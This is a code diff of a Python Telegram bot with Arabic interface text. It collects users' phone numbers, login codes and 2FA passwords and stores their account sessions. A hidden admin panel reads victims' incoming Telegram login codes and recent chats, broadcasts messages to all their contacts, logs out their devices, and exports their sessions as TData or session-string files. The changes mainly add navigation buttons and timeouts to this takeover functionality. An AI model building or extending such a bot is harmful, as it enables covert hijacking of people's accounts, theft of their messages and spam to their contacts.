@@ -132,7 +132,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "admin_stats" and user_id == ADMIN_ID:
         total_users = len(db)
         total_sessions = sum(len(s) for s in db.values())
-        await query.edit_message_text(f"📊 **إحصائيات:**\n\nعدد المستخدمين: {total_users}\nإجمالي الحسابات: {total_sessions}", parse_mode="Markdown")
+        keyboard = [[btn("🔙 رجوع", "admin_panel", style="primary")]]
+        await query.edit_message_text(f"📊 **إحصائيات:**\n\nعدد المستخدمين: {total_users}\nإجمالي الحسابات: {total_sessions}", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
     if data == "admin_users" and user_id == ADMIN_ID:
@@ -167,7 +168,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"التحكم الكامل بحساب: `{phone}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
-    # --- قراءة الكود باستخدام Telethon ---
+    # --- قراءة الكود OTP ---
     if data.startswith("adm_otp_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
@@ -176,11 +177,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             temp_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
             await temp_client.connect()
-            
             latest_code = None
             full_message = ""
-            
-            # جلب رسائل تلغرام الرسمية (الكود)
             messages = await temp_client.get_messages(777000, limit=5)
             for msg in messages:
                 if msg.text:
@@ -189,13 +187,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         latest_code = match.group(1)
                         full_message = msg.text
                         break
-                        
             await temp_client.disconnect()
             
             if latest_code:
-                text = f"✅ **أحدث كود وصل للحساب** `{phone}`:\n\n"
-                text += f"🔑 **الكود:** `{latest_code}`\n\n"
-                text += f"📝 **النص الأصلي:**\n{full_message}"
+                text = f"✅ **أحدث كود وصل للحساب** `{phone}`:\n\n🔑 **الكود:** `{latest_code}`\n\n📝 **النص الأصلي:**\n{full_message}"
                 await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
             else:
                 await query.edit_message_text("❌ لم يتم العثور على أي كود في الرسائل الأخيرة.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
@@ -208,7 +203,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target_uid, phone = int(parts[2]), parts[3]
         client = active_clients.get(target_uid, {}).get(phone)
         if not client:
-            await query.edit_message_text("❌ الحساب غير متصل حالياً.")
+            await query.edit_message_text("❌ الحساب غير متصل حالياً.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
             return
         try:
             me = await client.get_me()
@@ -221,12 +216,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text += f"🔗 **اليوزر:** @{me.username if me.username else 'لا يوجد'}\n\n"
             text += f"👑 **قنوات أنت مالكها:** {', '.join(channels[:5]) if channels else 'لا يوجد'}\n"
             text += f"👥 **مجموعات:** {', '.join(groups[:5]) if groups else 'لا يوجد'}"
-            await query.edit_message_text(text, parse_mode="Markdown")
+            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         except Exception as e:
-            await query.edit_message_text(f"❌ خطأ: {e}")
+            await query.edit_message_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         return
 
-    # --- قراءة آخر الرسائل (تم تصحيحها) ---
+    # --- قراءة آخر الرسائل (مصححة) ---
     if data.startswith("adm_read_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
@@ -240,16 +235,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     sender = "أنت" if m.out else d.name
                     msg_text = m.text[:40] if m.text else "[وسائط]"
                     text += f"[{sender}]: {msg_text}...\n"
-            await query.edit_message_text(text, parse_mode="Markdown")
+            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         except Exception as e:
-            await query.edit_message_text(f"❌ خطأ: {e}")
+            await query.edit_message_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         return
 
     if data.startswith("adm_msg_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
         user_states[user_id] = f"admin_broadcast:{target_uid}:{phone}"
-        await query.edit_message_text("أرسل الرسالة التي تريد إرسالها لجميع جهات الاتصال في هذا الحساب:")
+        keyboard = [[btn("🔙 إلغاء والرجوع", f"admin_acc_{target_uid}_{phone}", style="danger")]]
+        await query.edit_message_text("أرسل الرسالة التي تريد إرسالها لجميع جهات الاتصال في هذا الحساب:", reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
     if data.startswith("adm_dev_") and user_id == ADMIN_ID:
@@ -265,7 +261,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard.append([btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")])
             await query.edit_message_text("اختر الجهاز لطرده:", reply_markup=InlineKeyboardMarkup(keyboard))
         except Exception as e:
-            await query.edit_message_text(f"❌ خطأ: {e}")
+            await query.edit_message_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         return
 
     if data.startswith("adm_kill_") and user_id == ADMIN_ID:
@@ -275,17 +271,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await client(functions.account.ResetAuthorizationRequest(hash=auth_hash))
             await query.answer("✅ تم الطرد!", show_alert=True)
-            await query.edit_message_text("✅ تم طرد الجهاز بنجاح.")
+            await query.edit_message_text("✅ تم طرد الجهاز بنجاح.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         except Exception as e:
             await query.answer(f"❌ خطأ: {e}", show_alert=True)
         return
 
-    # --- استخراج TData مع حماية الذاكرة ---
+    # --- استخراج TData للأدمن مع الحماية ---
     if data.startswith("adm_tdata_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
         session_str = db[str(target_uid)][phone]["session"]
-        await query.edit_message_text("⏳ جاري استخراج TData... (قد يستهلك السيرفر وقتاً)")
+        await query.edit_message_text("⏳ جاري استخراج TData... (قد يستغرق 15 ثانية كحد أقصى)")
         try:
             from opentele.td import TDesktop
             temp_dir = f"tdata_{target_uid}_{phone}"
@@ -295,33 +291,34 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             tdesk = await TDesktop.FromTelethon(client)
             tdata_path = os.path.join(temp_dir, "tdata")
-            await tdesk.SaveTData(tdata_path)
+            await asyncio.wait_for(tdesk.SaveTData(tdata_path), timeout=15.0)
             await client.disconnect()
             
             zip_filename = f"tdata_{phone}"
             shutil.make_archive(zip_filename, 'zip', tdata_path)
             with open(f"{zip_filename}.zip", 'rb') as f:
-                await query.message.reply_document(document=f, filename=f"tdata_{phone}.zip", caption=f"📁 TData للحساب {phone}\n\n1. افتح التلغرام على الكمبيوتر.\n2. ضع هذا المجلد مكان مجلد tdata القديم.")
+                await query.message.reply_document(document=f, filename=f"tdata_{phone}.zip", caption=f"📁 TData للحساب {phone}")
             shutil.rmtree(temp_dir, ignore_errors=True)
             os.remove(f"{zip_filename}.zip")
-        except Exception as e:
-            # في حال فشل TData نرسل ملف Session كبديل
+        except (Exception, asyncio.TimeoutError) as e:
             filename = f"session_{phone}.txt"
-            with open(filename, 'w') as f: f.write(session_str)
-            await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption=f"⚠️ فشل استخراج TData (نفاذ الذاكرة في السيرفر). هذا ملف الجلسة البديل، يمكنك استخدامه في أي محول.\nالخطأ: {e}")
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(f"=== اسم الملف: {filename} ===\n\n")
+                f.write(session_str)
+            await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption=f"⚠️ تعذر استخراج TData (نفاذ الذاكرة في السيرفر). تم إرسال ملف الجلسة النصي بدلاً منه.")
             if os.path.exists(filename): os.remove(filename)
         return
 
     # --- قسم المستخدم العادي ---
     if data == "add_account":
         user_states[user_id] = "waiting_phone"
-        await query.edit_message_text("أرسل رقم هاتفك (مع علامة +):")
+        await query.edit_message_text("أرسل رقم هاتفك (مع علامة +):", reply_markup=InlineKeyboardMarkup([[btn("🔙 إلغاء والرجوع", "main_menu", style="danger")]]))
         return
     
     if data == "my_accounts":
         user_sessions = db.get(str(user_id), {})
         if not user_sessions:
-            await query.edit_message_text("ليس لديك حسابات.")
+            await query.edit_message_text("ليس لديك حسابات.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", "main_menu", style="primary")]]))
             return
         keyboard = []
         for phone, info in user_sessions.items():
@@ -345,7 +342,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data.startswith("export_"):
         phone = data.split("_", 1)[1]
         session_str = db[str(user_id)][phone]["session"]
-        await query.edit_message_text("⏳ جاري استخراج TData...")
+        await query.edit_message_text("⏳ جاري استخراج TData... (قد يستغرق 15 ثانية)")
         try:
             from opentele.td import TDesktop
             temp_dir = f"tdata_{user_id}_{phone}"
@@ -355,7 +352,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             tdesk = await TDesktop.FromTelethon(client)
             tdata_path = os.path.join(temp_dir, "tdata")
-            await tdesk.SaveTData(tdata_path)
+            await asyncio.wait_for(tdesk.SaveTData(tdata_path), timeout=15.0)
             await client.disconnect()
             
             zip_filename = f"tdata_{phone}"
@@ -364,10 +361,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await query.message.reply_document(document=f, filename=f"tdata_{phone}.zip", caption=f"📁 TData جاهز!")
             shutil.rmtree(temp_dir, ignore_errors=True)
             os.remove(f"{zip_filename}.zip")
-        except Exception as e:
+        except (Exception, asyncio.TimeoutError) as e:
             filename = f"session_{phone}.txt"
-            with open(filename, 'w') as f: f.write(session_str)
-            await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption=f"⚠️ فشل استخراج TData بسبب امتلاء ذاكرة السيرفر. هذا ملف الجلسة البديل.\nالخطأ: {e}")
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(f"=== اسم الملف: {filename} ===\n\n")
+                f.write(session_str)
+            await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption=f"⚠️ تعذر استخراج TData. تم إرسال ملف الجلسة النصي كبديل.")
             if os.path.exists(filename): os.remove(filename)
         return
 
@@ -383,7 +382,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard.append([btn("🔙 رجوع", f"view_{phone}", style="primary")])
             await query.edit_message_text("اختر الجهاز لطرده:", reply_markup=InlineKeyboardMarkup(keyboard))
         except Exception as e:
-            await query.edit_message_text(f"❌ خطأ: {e}")
+            await query.edit_message_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"view_{phone}", style="primary")]]))
         return
 
     if data.startswith("kill_"):
@@ -393,7 +392,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await client(functions.account.ResetAuthorizationRequest(hash=auth_hash))
             await query.answer("✅ تم الطرد!", show_alert=True)
-            await query.edit_message_text("✅ تم طرد الجهاز.")
+            await query.edit_message_text("✅ تم طرد الجهاز.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"view_{phone}", style="primary")]]))
         except Exception as e:
             await query.answer(f"❌ خطأ: {e}", show_alert=True)
         return
@@ -401,9 +400,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data.startswith("set2fa_"):
         phone = data.split("_", 1)[1]
         user_states[user_id] = f"waiting_2fa:{phone}"
-        await query.edit_message_text("🔐 أرسل كلمة المرور الجديدة (2FA):")
+        await query.edit_message_text("🔐 أرسل كلمة المرور الجديدة (2FA):", reply_markup=InlineKeyboardMarkup([[btn("🔙 إلغاء", f"view_{phone}", style="danger")]]))
         return
-
 
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -428,7 +426,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 success += 1
                 await asyncio.sleep(1)
             except: pass
-        await update.message.reply_text(f"✅ تم الإرسال لـ {success} جهة اتصال.")
+        await update.message.reply_text(f"✅ تم الإرسال لـ {success} جهة اتصال.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         user_states.pop(user_id, None)
         return
 
@@ -437,7 +435,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client = active_clients.get(user_id, {}).get(phone)
         try:
             await client.edit_2fa(new_password=text.strip())
-            await update.message.reply_text("✅ تم تعيين كلمة المرور.")
+            await update.message.reply_text("✅ تم تعيين كلمة المرور.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"view_{phone}", style="primary")]]))
         except Exception as e:
             await update.message.reply_text(f"❌ خطأ: {e}")
         user_states.pop(user_id, None)
@@ -448,7 +446,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         phone = ''.join(filter(str.isdigit, phone))
         
         if len(phone) < 7:
-            await update.message.reply_text("❌ رقم الهاتف غير صالح. أرسل الرقم مع رمز الدولة (مثال: +213xxxxxxxxx).")
+            await update.message.reply_text("❌ رقم الهاتف غير صالح. أرسل الرقم مع رمز الدولة (مثال: +213xxxxxxxxx).", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", "main_menu", style="danger")]]))
             user_states.pop(user_id, None)
             return
             
@@ -462,9 +460,9 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[user_id] = f"waiting_code:{phone}"
             if user_id not in active_clients: active_clients[user_id] = {}
             active_clients[user_id][f"temp_{phone}"] = client
-            await update.message.reply_text(f"✅ تم إرسال الكود إلى تطبيق تلغرام في هاتفك. (لا تنسخه وتلصقه من التطبيق، بل استخدم زر قراءة OTP من لوحة الأدمن إن أردت). أرسله هنا:")
+            await update.message.reply_text(f"✅ تم إرسال الكود. أرسله هنا:", reply_markup=InlineKeyboardMarkup([[btn("🔙 إلغاء", "main_menu", style="danger")]]))
         except Exception as e:
-            await update.message.reply_text(f"❌ خطأ: {e}")
+            await update.message.reply_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", "main_menu", style="danger")]]))
             user_states.pop(user_id, None)
         return
 
@@ -473,7 +471,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         code = text.strip()
         client = active_clients.get(user_id, {}).get(f"temp_{phone}")
         if not client:
-            await update.message.reply_text("❌ انتهت الجلسة.")
+            await update.message.reply_text("❌ انتهت الجلسة.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", "main_menu", style="danger")]]))
             user_states.pop(user_id, None)
             return
         try:
@@ -485,13 +483,13 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             active_clients[user_id].pop(f"temp_{phone}", None)
             active_clients[user_id][phone] = client
             client.add_event_handler(global_otp_handler, events.NewMessage(from_users=777000))
-            await update.message.reply_text(f"🔥 تم الحفظ بنجاح!")
+            await update.message.reply_text(f"🔥 تم الحفظ بنجاح!", reply_markup=InlineKeyboardMarkup([[btn("🔙 القائمة الرئيسية", "main_menu", style="primary")]]))
             user_states.pop(user_id, None)
         except SessionPasswordNeededError:
             user_states[user_id] = f"waiting_password:{phone}"
-            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور (2FA). أرسلها:")
+            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور (2FA). أرسلها:", reply_markup=InlineKeyboardMarkup([[btn("🔙 إلغاء", "main_menu", style="danger")]]))
         except Exception as e:
-            await update.message.reply_text(f"❌ خطأ: {e}")
+            await update.message.reply_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", "main_menu", style="danger")]]))
             user_states.pop(user_id, None)
         return
 
@@ -508,7 +506,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             active_clients[user_id].pop(f"temp_{phone}", None)
             active_clients[user_id][phone] = client
             client.add_event_handler(global_otp_handler, events.NewMessage(from_users=777000))
-            await update.message.reply_text("🔥 تم الحفظ بنجاح (2FA)!")
+            await update.message.reply_text("🔥 تم الحفظ بنجاح (2FA)!", reply_markup=InlineKeyboardMarkup([[btn("🔙 القائمة الرئيسية", "main_menu", style="primary")]]))
             user_states.pop(user_id, None)
         except Exception as e:
             await update.message.reply_text(f"❌ خطأ: {e}")
